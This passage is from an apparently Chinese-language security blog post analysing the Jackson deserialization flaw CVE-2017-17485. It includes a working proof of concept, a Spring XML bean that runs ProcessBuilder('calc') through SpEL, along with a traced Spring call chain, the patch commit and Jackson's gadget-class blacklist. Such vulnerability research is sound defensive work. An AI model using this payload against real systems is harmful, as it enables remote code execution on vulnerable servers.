class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mapper.readValue(payload, Object.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spel.xml，放置在第三方 Web 服务中，看到 id 为 pb 的 bean 标签，指定了类为 <code>java.lang.ProcessBuilder</code>，在其中有两个子标签，<code>constructor-arg</code> 标签设置参数值为具体的命令，property 标签调用 <code>start()</code> 方法：</p><p><strong>spel.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;  </span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc&quot;</span> /&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功命令执行</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/calc.png" class><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>这里的 XML 内容解析，到 SpEL 表达式注入，其实是涉及到 Spring 的 IOC 原则，简单来过一遍。</p><p>前面 Jackson 的反序列化解析部分就不看了，直接到 Jackson 调用 <code>ClassPathXmlApplicationContext</code> 的构造函数。在 <code>ClassPathXmlApplicationContext</code> 中有很多构造方法，其中有一个是传入一个字符串的（即配置文件的相对路径），但最终是调用的下面这个构造：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/ClassPathXmlApplicationContextConstructor.png" class><p>Spring 在这里先创建解析器，解析 configLocations，跟进 <code>refresh()</code> 方法，<code>refresh()</code> 方法做的核心业务是刷新容器（启动容器都会调用该方法），跟进之后的核心代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;  </span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) &#123;  </span><br><span class="line">       <span class="comment">// Prepare this context for refreshing.  </span></span><br><span class="line">       prepareRefresh();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// Tell the subclass to refresh the internal bean factory.  </span></span><br><span class="line">       <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// Prepare the bean factory for use in this context.  </span></span><br><span class="line">       prepareBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">try</span> &#123;  </span><br><span class="line">          <span class="comment">// Allows post-processing of the bean factory in context subclasses.  </span></span><br><span class="line">          postProcessBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Invoke factory processors registered as beans in the context.  </span></span><br><span class="line">          invokeBeanFactoryPostProcessors(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Register bean processors that intercept bean creation.  </span></span><br><span class="line">          registerBeanPostProcessors(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize message source for this context.  </span></span><br><span class="line">          initMessageSource();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize event multicaster for this context.  </span></span><br><span class="line">          initApplicationEventMulticaster();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize other special beans in specific context subclasses.  </span></span><br><span class="line">          onRefresh();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Check for listener beans and register them.  </span></span><br><span class="line">          registerListeners();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.  </span></span><br><span class="line">          finishBeanFactoryInitialization(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Last step: publish corresponding event.  </span></span><br><span class="line">          finishRefresh();  </span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>先跟进 <code>obtainFreshBeanFactory()</code> 方法，这个方法是一个典型的<strong>模板方法模式</strong>的实现，第一步是准备初始化容器环境，这一步不重要，重点是第二步，创建 BeanFactory 对象、加载解析 xml 并封装成<strong>BeanDefinition</strong>对象都是在这一步完成的。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/obtainFreshBeanFactory.png" class><p>跟进，判断如果 BeanFactory 不为空，则清除 BeanFactory 和里面的实例，接着创建了一个 <strong>DefaultListableBeanFactory</strong> 对象并传入到了 <strong>loadBeanDefinitions</strong> 方法中，这也是一个模板方法，因为我们的配置不止有 xml，还有注解等。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/refreshBeanFactory.png" class><p>在整体封装完毕之后，这里的 XML 就已经被加载进来了，把 inputSource 封装成 Document 文件对象。核心代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(EncodedResource encodedResource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取Resource对象中的xml文件流对象</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> encodedResource.getResource().getInputStream();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//InputSource是jdk中的sax xml文件解析对象</span></span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(inputStream);</span><br><span class="line"><span class="keyword">if</span> (encodedResource.getEncoding() != <span class="literal">null</span>) &#123;</span><br><span class="line">inputSource.setEncoding(encodedResource.getEncoding());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主要看这个方法</span></span><br><span class="line"><span class="keyword">return</span> doLoadBeanDefinitions(inputSource, encodedResource.getResource());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">inputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">doLoadBeanDefinitions</span><span class="params">(InputSource inputSource, Resource resource)</span></span><br><span class="line"><span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//把inputSource 封装成Document文件对象，这是jdk的API</span></span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> doLoadDocument(inputSource, resource);</span><br><span class="line"></span><br><span class="line"><span class="comment">//主要看这个方法，根据解析出来的document对象，拿到里面的标签元素封装成BeanDefinition</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> registerBeanDefinitions(doc, resource);</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Loaded &quot;</span> + count + <span class="string">&quot; bean definitions from &quot;</span> + resource);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">registerBeanDefinitions</span><span class="params">(Document doc, Resource resource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"><span class="comment">// 创建DefaultBeanDefinitionDocumentReader对象，并委托其做解析注册工作</span></span><br><span class="line"><span class="type">BeanDefinitionDocumentReader</span> <span class="variable">documentReader</span> <span class="operator">=</span> createBeanDefinitionDocumentReader();</span><br><span class="line"><span class="type">int</span> <span class="variable">countBefore</span> <span class="operator">=</span> getRegistry().getBeanDefinitionCount();</span><br><span class="line"><span class="comment">//主要看这个方法，需要注意createReaderContext方法中创建的几个对象</span></span><br><span class="line">documentReader.registerBeanDefinitions(doc, createReaderContext(resource));</span><br><span class="line"><span class="keyword">return</span> getRegistry().getBeanDefinitionCount() - countBefore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> XmlReaderContext <span class="title function_">createReaderContext</span><span class="params">(Resource resource)</span> &#123;</span><br><span class="line"><span class="comment">// XmlReaderContext对象中保存了XmlBeanDefinitionReader对象和DefaultNamespaceHandlerResolver对象的引用，在后面会用到</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">XmlReaderContext</span>(resource, <span class="built_in">this</span>.problemReporter, <span class="built_in">this</span>.eventListener,</span><br><span class="line"><span class="built_in">this</span>.sourceExtractor, <span class="built_in">this</span>, getNamespaceHandlerResolver());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doLoadBeanDefinitions.png" class><p>接着看看 <strong>DefaultBeanDefinitionDocumentReader</strong> 中是如何解析的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doRegisterBeanDefinitions</span><span class="params">(Element root)</span> &#123;</span><br><span class="line"><span class="comment">// 创建了BeanDefinitionParserDelegate对象</span></span><br><span class="line"><span class="type">BeanDefinitionParserDelegate</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.delegate;</span><br><span class="line"><span class="built_in">this</span>.delegate = createDelegate(getReaderContext(), root, parent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是Spring原生命名空间，首先解析 profile标签，这里不重要</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">profileSpec</span> <span class="operator">=</span> root.getAttribute(PROFILE_ATTRIBUTE);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(profileSpec)) &#123;</span><br><span class="line">String[] specifiedProfiles = StringUtils.tokenizeToStringArray(</span><br><span class="line">profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);</span><br><span class="line"><span class="comment">// We cannot use Profiles.of(...) since profile expressions are not supported</span></span><br><span class="line"><span class="comment">// in XML config. See SPR-12458 for details.</span></span><br><span class="line"><span class="keyword">if</span> (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Skipped XML bean definition file due to specified profiles [&quot;</span> + profileSpec +</span><br><span class="line"><span class="string">&quot;] not matching: &quot;</span> + getReaderContext().getResource());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preProcessXml(root);</span><br><span class="line"></span><br><span class="line"><span class="comment">//主要看这个方法，标签具体解析过程</span></span><br><span class="line">parseBeanDefinitions(root, <span class="built_in">this</span>.delegate);</span><br><span class="line">postProcessXml(root);</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.delegate = parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的调用栈是这么走下来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doRegisterBeanDefinitions:<span class="number">129</span>, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)</span><br><span class="line">registerBeanDefinitions:<span class="number">98</span>, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)</span><br><span class="line">registerBeanDefinitions:<span class="number">507</span>, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)</span><br><span class="line">doLoadBeanDefinitions:<span class="number">391</span>, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)</span><br></pre></td></tr></table></figure><p>在这个方法中重点关注<strong>preProcessXml</strong>、<strong>parseBeanDefinitions</strong>、<strong>postProcessXml</strong>三个方法，其中 preProcessXml 和 postProcessXml 都是空方法，意思是在解析标签前后我们自己可以扩展需要执行的操作，也是一个模板方法模式，体现了 Spring 的高扩展性。然后进入 parseBeanDefinitions 方法看具体是怎么解析标签的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parseBeanDefinitions</span><span class="params">(Element root, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line"><span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nl.getLength(); i++) &#123;</span><br><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nl.item(i);</span><br><span class="line"><span class="keyword">if</span> (node <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line"><span class="type">Element</span> <span class="variable">ele</span> <span class="operator">=</span> (Element) node;</span><br><span class="line"><span class="keyword">if</span> (delegate.isDefaultNamespace(ele)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认标签解析</span></span><br><span class="line">parseDefaultElement(ele, delegate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义标签解析</span></span><br><span class="line">delegate.parseCustomElement(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">delegate.parseCustomElement(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有两种标签的解析：<strong>Spring 原生标签</strong>和<strong>自定义标签</strong>。怎么区分这两种标签呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义标签</span></span><br><span class="line">&lt;context:component-scan/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认标签</span></span><br><span class="line">&lt;bean:/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上，带前缀的就是自定义标签，否则就是 Spring 默认标签，无论哪种标签在使用前都需要在 Spring 的 xml 配置文件里声明 Namespace URI，这样在解析标签时才能通过 Namespace URI 找到对应的 NamespaceHandler。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/beans</span><br></pre></td></tr></table></figure><p>可以看到 <code>http://www.springframework.org/schema/beans</code> 所对应的就是默认标签。接着，我们进入<strong>parseDefaultElement</strong>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseDefaultElement</span><span class="params">(Element ele, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line"><span class="comment">//import标签解析 </span></span><br><span class="line"><span class="keyword">if</span> (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) &#123;</span><br><span class="line">importBeanDefinitionResource(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//alias标签解析</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) &#123;</span><br><span class="line">processAliasRegistration(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bean标签</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) &#123;</span><br><span class="line">processBeanDefinition(ele, delegate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) &#123;</span><br><span class="line"><span class="comment">// recurse</span></span><br><span class="line">doRegisterBeanDefinitions(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里面主要是对 import、alias、bean 标签的解析以及 beans 的字标签的递归解析，最终会将这些标签属性的值装入到 BeanDefinition 对象中，这里接近能够拿到一个封装好的 XML document 了，并且被解析为 Bean。</p><p>回到最开始的地方，来关注一下漏洞点，其中有一个 <code>invokeBeanFactoryPostProcessors()</code> 方法，顾名思义，就是调用上下文中注册为 beans 的工厂处理器：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/invokeBeanFactoryPostProcessors.png" class><p>继续跟下去，<code>invokeBeanFactoryPostProcessors()</code> 方法中调用了 <code>getBeanNamesForType()</code> 函数来获取 Bean 名类型：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/getBeanNamesForType.png" class><p>往下，进一步调用 <code>doGetBeanNamesForType()</code> 方法：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doGetBeanNamesForType.png" class><p>在 <code>doGetBeanNamesForType()</code> 方法中，调用 <code>isFactoryBean()</code> 判断当前 beanName 是否为 FactoryBean，此时 beanName 参数值为 <strong>pb</strong>，mbd 参数中识别到 bean 标签中的类为 <code>java.lang.ProcessBuilder</code>：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/isFactoryBean.png" class><p>在 <code>isFactoryBean()</code> 方法中，调用 <code>predictBeanType()</code> 方法获取 Bean 类型：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/predictBeanType.png" class><p>跟下去，<code>AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()</code>，用来解析 Bean 类，其中调用了 <code>evaluateBeanDefinitionString()</code> 方法来执行 Bean 定义的字符串内容，此时 className 参数指向 <code>java.lang.ProcessBuilder</code>：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/targetType.png" class><p>同时在这里第 432 行，<code>this.resolveBeanClass()</code> 方法是用于指定解析器的，我们跟进去看一下</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doResolveBeanClass.png" class><p>跟进 <code>doResolveBeanClass()</code> 方法，进一步解析 Bean，随后跟进 <code>AbstractBeanFactory.evaluateBeanDefinitionString()</code> 方法，其中调用了 <code>this.beanExpressionResolver.evaluate()</code></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/evaluateBeanDefinitionString.png" class><p>此时 <code>this.beanExpressionResolver</code> 指向的是 <code>StandardBeanExpressionResolver</code>，也就是说已经调用到对应的 SpEL 表达式解析器了：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/spelExpressionResolver.png" class><p>跟进 <code>StandardBeanExpressionResolver.evaluate()</code> 方法，发现调用了 Expression. getValue ()方法即 SpEL 表达式执行的方法，其中 sec 参数是我们可以控制的内容即由 spel. xml 解析得到的 SpEL 表达式：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/secSpEL.png" class><p>后续就是 SpEL 表达式注入漏洞导致的任意代码执行了。</p><p>至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 类，它的构造函数存在 SpEL 注入漏洞，进而导致可被利用来触发 Jackson 反序列化漏洞。</p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p><a class="link" href="https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf">https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf<i class="fas fa-external-link-alt"></i></a></p><p>换成 jackson-databind-2.7.9.2版本的 jar 试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fix.png" class><p>但是去看黑名单的规则，其实并没有看到黑名单类里面有我们利用的这个类</p><p><code>com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;  </span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();  </span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:  </span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.springframework.beans.factory.ObjectFactory&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance  